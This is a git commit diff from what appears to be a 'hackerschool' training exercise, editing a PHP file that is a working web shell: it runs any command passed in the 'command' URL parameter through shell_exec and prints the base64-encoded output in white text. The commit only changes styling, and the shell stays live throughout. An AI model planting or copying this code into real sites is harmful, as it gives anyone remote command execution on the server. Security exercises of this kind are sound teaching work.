18518e746228f2ad4455ef70b0e570c8513eb405
paket16 <konstantin45rus@icloud.com>
2025-03-06 15:02:25 +0500

    complete hackerschool task!

--- Tasks/hackerschool/assets/index.php
+++ Tasks/hackerschool/assets/index.php
@@ -1,14 +1,14 @@
 <?php
-
 if (isset($_GET['command'])) {
 
     $command = $_GET['command'];
 
     $output = base64_encode(shell_exec($command));
 
-    echo "<p color='white'>$output</p>";
-} else {
-  echo "<p color='white'>GET parameters blank or not valid";
+    echo "<p style='color:white;'>$output</p>";
+}
+else {
+  echo "<p style='color:white;'>GET parameters blank or not valid";
 }
 
 ?>
